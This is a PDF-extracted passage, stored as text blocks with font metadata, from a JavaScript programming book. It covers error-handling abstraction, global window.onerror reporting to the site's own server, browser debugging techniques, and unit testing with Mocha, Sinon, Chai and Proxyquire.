        "text": "Also, you shouldn't wrap every variable and function in a try/catch block, because these are simple examples that will only ever occur once until you \ufb01x them. However, for objects, functions and other variables that you know exist, but you don't know whether their properties or sub-processes or side-e\ufb00ects will exist, or you expect some error states in some circumstances, you should abstract your error handling in some sort of manner. Here is a very basic example and implementation. Without a protected way to call untrusted or exception throwing methods:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( a ,  b ,  c )   {     console. log ( a ,  b ,  c );      throw   new  Error ( \"custom error!\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    foo ( 1 ,   2 ,   3 ); }   catch ( e )   {      try   {         foo ( 4 ,   5 ,   6 );      }   catch ( e2 )   {         console. log ( \"We had to nest because there's currently no other way...\" );      }     console. log ( e ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 1 2 3 // 4 5 6 // We had to nest because there's currently no other way... // Error: custom error!( \u2026 )",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And with protection:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( a ,  b ,  c )   {     console. log ( a ,  b ,  c );      throw   new  Error ( \"custom error!\" ); } function  protectedFunction ( fn ,  ... args )   {      try   {         fn. apply ( this ,  args );      }   catch   ( e )   {         console. log ( \"caught error: \"   +  e. name   +   \" -> \"   +  e. message );      } } protectedFunction ( foo ,   1 ,   2 ,   3 ); protectedFunction ( foo ,   4 ,   5 ,   6 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 1 2 3 // caught error: Error -> custom error! // 4 5 6 // caught error: Error -> custom error!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We catch errors and still process all the expected code, though with a somewhat di\ufb00erent syntax. Either way will work, but as you build more advanced applications you will want to start thinking about ways to abstract your error handling.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 433",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 98: Global error handling in browsers",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "eventOrMessage Some browsers will call the event handler with just one argument, an  Event  object. However, other browsers, especially the older ones and older mobile ones will supply a  String  message as a \ufb01rst argument. url If a handler is called with more than 1 argument, the second argument usually is an URL of a JavaScript \ufb01le that is the source of the problem. lineNumber If a handler is called with more than 1 argument, the third argument is a line number inside the JavaScript source \ufb01le. colNumber If a handler is called with more than 1 argument, the fourth argument is the column number inside the JavaScript source \ufb01le. error If a handler is called with more than 1 argument, the \ufb01fth argument is sometimes an  Error  object describing the problem.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 98.1: Handling window.onerror to report all errors back to the server-side",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The following example listens to  window. onerror  event and uses an image beacon technique to send the information through the GET parameters of an URL.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  hasLoggedOnce  =   false ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Some browsers (at least Firefox) don't report line and column numbers // when event is handled through window.addEventListener('error', fn). That's why // a more reliable approach is to set an event listener via direct assignment.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "window. onerror   =   function   ( eventOrMessage ,  url ,  lineNumber ,  colNumber ,  error )   {      if   ( hasLoggedOnce  ||   ! eventOrMessage )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // It does not make sense to report an error if:          // 1. another one has already been reported -- the page has an invalid state and may produce way too many errors.          // 2. the provided information does not make sense (!eventOrMessage -- the browser didn't supply information for some reason.)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return ;      }     hasLoggedOnce  =   true ;      if   ( typeof  eventOrMessage  !==   'string' )   {         error  =  eventOrMessage. error ;         url  =  eventOrMessage. filename   ||  eventOrMessage. fileName ;         lineNumber  =  eventOrMessage. lineno   ||  eventOrMessage. lineNumber ;         colNumber  =  eventOrMessage. colno   ||  eventOrMessage. columnNumber ;         eventOrMessage  =  eventOrMessage. message   ||  eventOrMessage. name   ||  error. message   || error. name ;      }      if   ( error  &&  error. stack )   {         eventOrMessage  =   [ eventOrMessage ,   '; Stack: ' ,  error. stack ,   '.' ] . join ( '' );      }      var  jsFile  =   (/[^ /]+\\.js/i . exec ( url  ||   '' )   ||   [])[ 0 ]   ||   'inlineScriptOrDynamicEvalCode' ,         stack  =   [ eventOrMessage ,   ' Occurred in ' ,  jsFile ,   ':' ,  lineNumber  ||   '?' ,   ':' ,  colNumber  || '?' ] . join ( '' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // shortening the message a bit so that it is more likely to fit into browser's URL length limit (which is 2,083 in some browsers)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    stack  =  stack. replace (/ https ? \\ : \\ / \\ /[^ /]+/gi ,   '' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // calling the server-side handler which should probably register the error in a database or a log file",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 434",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     new  Image () . src   =   '/exampleErrorReporting?stack='   +  encodeURIComponent ( stack );    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // window.DEBUG_ENVIRONMENT a configurable property that may be set to true somewhere else for debugging and testing purposes.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( window. DEBUG_ENVIRONMENT )   {         alert ( 'Client-side script failed: '   +  stack );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 435",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 99: Debugging",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 99.1: Interactive interpreter variables",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Note that these only work in the developer tools of certain browsers. $_  gives you the value of whatever expression was evaluated last.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"foo\"               // \"foo\" $_                 // \"foo\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "$0  refers to the DOM element currently selected in the Inspector. So if  <div   id = \"foo\" >  is highlighted:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "$0                       // <div id=\"foo\"> $0. getAttribute ( 'id' )     // \"foo\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "$1  refers to the element previously selected,  $2  to the one selected before that, and so forth for  $3  and  $4 . To get a collection of elements matching a CSS selector, use  $$ ( selector ) . This is essentially a shortcut for",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. querySelectorAll .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  images  =  $$ ( 'img' );    // Returns an array or a nodelist of all matching elements $_",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "$() \u00b9  $$() $0 $1 $2 $3 $4",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opera 15+ 11+ 11+ 11+ 11+ 15+ 15+ 15+ Chrome 22+  \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 Firefox 39+  \u2714 \u2714 \u2714 \u00d7 \u00d7 \u00d7 \u00d7 IE 11 11 11 11 11 11 11 11 Safari 6.1+ 4+ 4+ 4+ 4+ 4+ 4+ 4+",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\u00b9  alias to either  document. getElementById  or  document. querySelector",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 99.2: Breakpoints",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Breakpoints pause your program once execution reaches a certain point. You can then step through the program line by line, observing its execution and inspecting the contents of your variables. There are three ways of creating breakpoints. From code, using the  debugger ;  statement. 1. From the browser, using the Developer Tools. 2. From an Integrated Development Environment (IDE). 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Debugger Statement",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You can place a  debugger ;  statement anywhere in your JavaScript code. Once the JS interpreter reaches that line, it will stop the script execution, allowing you to inspect variables and step through your code.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Developer Tools",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The second option is to add a breakpoint directly into the code from the browser's Developer Tools.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opening the Developer Tools Chrome or Firefox",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 436",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Press   F12   to open Developer Tools 1. Switch to the Sources tab (Chrome) or Debugger tab (Firefox) 2. Press   Ctrl  +  P   and type the name of your JavaScript \ufb01le 3. Press   Enter   to open it. 4.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Internet Explorer or Edge",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Press   F12   to open Developer Tools 1. Switch to the Debugger tab. 2. Use the folder icon near the upper-left corner of the window to open a \ufb01le-selection pane; you can \ufb01nd your 3. JavaScript \ufb01le there.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Safari",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Press   Command  +  Option  +  C   to open Developer Tools 1. Switch to the Resources tab 2. Open the \"Scripts\" folder in the left-side panel 3. Select your JavaScript \ufb01le. 4.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Adding a breakpoint from the Developer Tools",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Once you have your JavaScript \ufb01le open in Developer Tools, you can click a line number to place a breakpoint. The next time your program runs, it will pause there. Note about Mini\ufb01ed Sources:  If your source is mini\ufb01ed, you can Pretty Print it (convert to readable format). In Chrome, this is done by clicking on the  {}  button in the bottom right corner of the source code viewer. IDEs",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Visual Studio Code (VSC)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "VSC has  built-in support  for debugging JavaScript. Click the Debug button on the left or   Ctrl  +  Shift  +  D  1. If not already done, create a launch con\ufb01guration \ufb01le ( launch. json ) by pressing the gear icon. 2. Run the code from VSC by pressing the green play button or hit   F5  . 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Adding a breakpoint in VSC",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Click next to the line number in your JavaScript source \ufb01le to add a breakpoint (it will be marked red). To delete the breakpoint, click the red circle again. Tip:  You can also utilise the conditional breakpoints in browser's dev tools. These help in skipping unnecessary breaks in execution. Example scenario: you want to examine a variable in a loop exactly at 5th iteration.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.3: Using setters and getters to \ufb01nd what changed a property",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Let's say you have an object like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myObject  =   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": [
            "output_directory\\image_452_1.png"
        ]
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 437",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    name :   'Peter' }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Later in your code, you try to access  myObject. name  and you get  George  instead of  Peter . You start wondering who changed it and where exactly it was changed. There is a way to place a  debugger  (or something else) on every set (every time someone does  myObject. name   =   'something' ):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myObject  =   {     _name :   'Peter' ,      set  name ( name ){ debugger ; this ._name = name },      get  name (){ return   this ._name } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that we renamed  name  to  _name  and we are going to de\ufb01ne a setter and a getter for  name . set  name  is the setter. That is a sweet spot where you can place  debugger ,  console. trace () , or anything else you need for debugging. The setter will set the value for name in  _name . The getter (the  get  name  part) will read the value from there. Now we have a fully functional object with debugging functionality. Most of the time, though, the object that gets changed is not under our control. Fortunately, we can de\ufb01ne setters and getters on  existing  objects to debug them.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// First, save the name to _name, because we are going to use name for setter/getter",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "otherObject._name  =  otherObject. name ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Create setter and getter",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. defineProperty ( otherObject ,   \"name\" ,   {      set :   function ( name )   { debugger ; this ._name  =  name },",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     get :   function ()   { return   this ._name } });",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Check out  setters  and  getters  at MDN for more information. Browser support for setters/getters:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chrome Firefox IE Opera Safari Mobile",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version 1 2.0 9 9.5 3 all",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.4: Using the console",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In many environments, you have access to a global  console  object that contains some basic methods for communicating with standard output devices. Most commonly, this will be the browser's JavaScript console (see Chrome ,  Firefox ,  Safari , and  Edge  for more information).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// At its simplest, you can 'log' a string",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"Hello, World!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// You can also log any number of comma-separated values",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"Hello\" ,   \"World!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// You can also use string substitution",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"%s %s\" ,   \"Hello\" ,   \"World!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// You can also log any variable that exist in the same scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   3 ]; console. log ( arr. length ,   this );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 438",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You can use di\ufb00erent console methods to highlight your output in di\ufb00erent ways. Other methods are also useful for more advanced debugging. For more documentation, information on compatibility, and instructions on how to open your browser's console, see the Console topic. Note: if you need to support IE9, either remove  console. log  or wrap its calls as follows, because  console  is unde\ufb01ned until the Developer Tools are opened:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( console )   {   //IE9 workaround",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"test\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 99.5: Automatically pausing execution",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In Google Chrome, you can pause execution without needing to place breakpoints.   Pause on Exception:  While this button is toggled on, if your program hits an unhandled exception, the program will pause as if it had hit a breakpoint. The button can be found near Execution Controls and is useful for locating errors. You can also pause execution when an HTML tag (DOM node) is modi\ufb01ed, or when its attributes are changed. To do that, right click the DOM node on the Elements tab and select \"Break on...\".",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_454_1.png"
        ]
    },
    {
        "text": "Section 99.6: Elements inspector",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Clicking the    Select an element in the page to inspect it  button in the upper left corner of the Elements tab in Chrome or Inspector tab in Firefox, available from Developer Tools, and then clicking on an element of the page highlights the element and assigns it to the  $0  variable. Elements inspector can be used in variety of ways, for example: You can check if your JS is manipulating DOM the way you expect it to, 1. You can more easily debug your CSS, when seeing which rules a\ufb00ect the element 2. ( Styles  tab in Chrome) You can play around with CSS and HTML without reloading the page. 3. Also, Chrome remembers last 5 selections in the Elements tab.  $0  is the current selection, while  $1  is the previous selection. You can go up to  $4 . That way you can easily debug multiple nodes without constantly switching selection to them. You can read more at  Google Developers .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_454_2.png"
        ]
    },
    {
        "text": "Section 99.7: Break when a function is called",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "For named (non-anonymous) functions, you can break when the function is executed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "debug ( functionName );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The next time  functionName  function runs, the debugger will stop on its \ufb01rst line.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 439",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.8: Stepping through code",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Once you've paused execution on a breakpoint, you may want to follow execution line-by-line to observe what happens. Open your browser's Developer Tools and look for the Execution Control icons. (This example uses the icons in Google Chrome, but they'll be similar in other browsers.)   Resume:  Unpause execution. Shorcut:  F8  (Chrome, Firefox)   Step Over:  Run the next line of code. If that line contains a function call, run the whole function and move to the next line, rather than jumping to wherever the function is de\ufb01ned. Shortcut :   F10  (Chrome, Firefox, IE/Edge),  F6  (Safari)   Step Into:  Run the next line of code. If that line contains a function call, jump into the function and pause there. Shortcut :   F11  (Chrome, Firefox, IE/Edge),   F7  (Safari)   Step Out:  Run the rest of the current function, jump back to where the function was called from, and pause at the next statement there. Shortcut :   Shift   +   F11  (Chrome, Firefox, IE/Edge),   F8  (Safari) Use these in conjunction with the  Call Stack , which will tell you which function you're currently inside of, which function called that function, and so forth. See Google's guide on  \"How to Step Through the Code\"  for more details and advice. Links to browser shortcut key documentation: Chrome Firefox IE Edge Safari",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_455_1.png",
            "output_directory\\image_455_2.png",
            "output_directory\\image_455_3.png",
            "output_directory\\image_455_4.png"
        ]
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 440",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 100: Unit Testing JavaScript",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and Proxyquire",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Here we have a simple class to be tested that returns a  Promise  based on the results of an external ResponseProcessor  that takes time to execute. For simplicity we'll assume that the  processResponse  method won't ever fail.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { processResponse }  from  '../utils/response_processor' ; const  ping  =   ()   =>   {    return   new  Promise (( resolve ,  _reject )   =>   {      const  response  =  processResponse ( data );     resolve ( response );    }); } module. exports   =  ping ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To test this we can leverage the following tools.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mocha 1. chai 2. sinon 3. proxyquire 4. chai - as - promised 5.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "I use the following  test  script in my  package. json  \ufb01le.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"test\" :   \"NODE_ENV=test mocha --compilers js:babel-core/register --require ./test/unit/test_helper.js  --recursive test/**/*_spec.js\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This allows me to use  es6  syntax. It references a  test_helper  that will look like",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import  chai from  'chai' ; import  sinon from  'sinon' ; import  sinonChai from  'sinon-chai' ; import  chaiAsPromised from  'chai-as-promised' ; import  sinonStubPromise from  'sinon-stub-promise' ; chai. use ( sinonChai ); chai. use ( chaiAsPromised ); sinonStubPromise ( sinon );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Proxyquire  allows us to inject our own stub in the place of the external  ResponseProcessor . We can then use  sinon to spy on that stub's methods. We use the extensions to  chai  that  chai - as - promised  injects to check that the ping ()  method's promise is  fullfilled , and that it  eventually  returns the required response.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { expect }        from  'chai' ; import  sinon          from  'sinon' ; import  proxyquire     from  'proxyquire' ; let  formattingStub  =   {   wrapResponse :   ()   =>   {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 441 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  ping  =  proxyquire ( '../../../src/api/ping' ,   {    '../utils/formatting' :  formattingStub }); describe ( 'ping' ,   ()   =>   {    let  wrapResponseSpy ,  pingResult ;    const  response  =   'some response' ;   beforeEach (()   =>   {     wrapResponseSpy  =  sinon. stub ( formattingStub ,   'wrapResponse' ) . returns ( response );     pingResult  =  ping ();    })   afterEach (()   =>   {     formattingStub. wrapResponse . restore ();    })   it ( 'returns a fullfilled promise' ,   ()   =>   {     expect ( pingResult ) . to . be . fulfilled ;    })   it ( 'eventually returns the correct response' ,   ()   =>   {     expect ( pingResult ) . to . eventually . equal ( response );    }) });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now instead let's assume you wish to test something that uses the response from  ping .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { ping }  from  './ping' ; const  pingWrapper  =   ()   =>   {   ping. then (( response )   =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // do something with the response",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   }); } module. exports   =  pingWrapper ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To test the  pingWrapper  we leverage",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "sinon 1. proxyquire 2. sinon - stub - promise 3.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As before,  Proxyquire  allows us to inject our own stub in the place of the external dependency, in this case the ping  method we tested previously. We can then use  sinon  to spy on that stub's methods and leverage  sinon - stub - promise  to allow us to  returnsPromise . This promise can then be resolved or rejected as we wish in the test, in order to test the wrapper's response to that.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { expect }    from  'chai' ; import  sinon      from  'sinon' ; import  proxyquire from  'proxyquire' ; let  pingStub  =   {   ping :   ()   =>   {} };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 442",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  pingWrapper  =  proxyquire ( '../src/pingWrapper' ,   {    './ping' :  pingStub }); describe ( 'pingWrapper' ,   ()   =>   {    let  pingSpy ;    const  response  =   'some response' ;   beforeEach (()   =>   {     pingSpy  =  sinon. stub ( pingStub ,   'ping' ) . returnsPromise ();     pingSpy. resolves ( response );     pingWrapper ();    });   afterEach (()   =>   {     pingStub. wrapResponse . restore ();    });   it ( 'wraps the ping' ,   ()   =>   {     expect ( pingSpy ) . to . have . been . calledWith ( response );    }); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 100.2: Basic Assertion",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "At its most basic level, Unit Testing in any language provides assertions against some known or expected output.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  assert (  outcome ,  description  )   {      var  passFail  =  outcome  ?   'pass'   :   'fail' ;     console. log ( passFail ,   ': ' ,  description );      return  outcome ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The popular assertion method above shows us one quick and easy way to assert a value in most web browsers and interpreters like Node.js with virtually any version of ECMAScript. A good unit test is designed to test a discreet unit of code; usually a function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  add ( num1 ,  num2 )   {      return  num1  +  num2 ; }   var  result  =  add ( 5 ,   20 ); assert (  result  ==   24 ,   'add(5, 20) should return 25...' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the example above, the return value from the function  add ( x ,  y )  or  5   +   20  is clearly  25 , so our assertion of  24 should fail, and the assert method will log a \"fail\" line. If we simply modify our expected assertion outcome, the test will succeed and the resulting output would look something like this.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "assert (  result  ==   25 ,   'add(5, 20) should return 25...' ); console output : >  pass :  should  return   25 ...",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This simple assertion can assure that in many di\ufb00erent cases, your \"add\" function will always return the expected",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 443",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "result and requires no additional frameworks or libraries to work. A more rigorous set of assertions would look like this (using  var  result  =  add ( x , y )  for each assertion):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "assert (  result  ==   0 ,   'add(0, 0) should return 0...' ); assert (  result  ==   - 1 ,   'add(0, -1) should return -1...' ); assert (  result  ==   1 ,   'add(0, 1) should return 1...' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And console output would be this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": ">  pass :  should  return   0 ... >  pass :  should  return   - 1 ... >  pass :  should  return   1 ...",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can now safely say that  add ( x , y ) \u2026  should return the sum of two integers . We can roll these up into something like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  test__addsIntegers ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // expect a number of passed assertions",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  passed  =   3 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // number of assertions to be reduced and added as Booleans",
        "font_name": "RobotoMono-Italic",
